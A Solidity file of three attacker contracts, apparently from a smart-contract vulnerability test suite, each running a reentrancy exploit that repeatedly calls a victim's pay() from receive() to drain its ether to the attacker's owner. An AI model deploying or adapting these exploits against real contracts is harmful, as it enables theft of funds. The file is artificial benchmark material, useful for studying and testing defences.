// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../interfaces/single-function/ILowLevelCallToTarget.sol";

contract LowLevelCallToTarget_Attacker {
    ILowLevelCallToTarget public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToTarget(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.pay();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.pay();
        }
    }
}

contract LowLevelCallToTarget_Attacker2 {
    // LowLevelCallToTarget_Attacker2: calls c.pay with address parameter
    ILowLevelCallToTargetWithParameter public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToTargetWithParameter(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.pay(address(this));
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.pay(address(this));
        }
    }
}

contract LowLevelCallToTarget_Attacker3 {
    // LowLevelCallToTarget_Attacker3: sets victim address after deployment

    function attack(address _victim) external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        ILowLevelCallToTarget(_victim).deposit{value: 1 ether}();
        ILowLevelCallToTarget(_victim).pay();
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (msg.sender.balance >= 1 ether) {
            ILowLevelCallToTarget(msg.sender).pay();
        }
    }
}
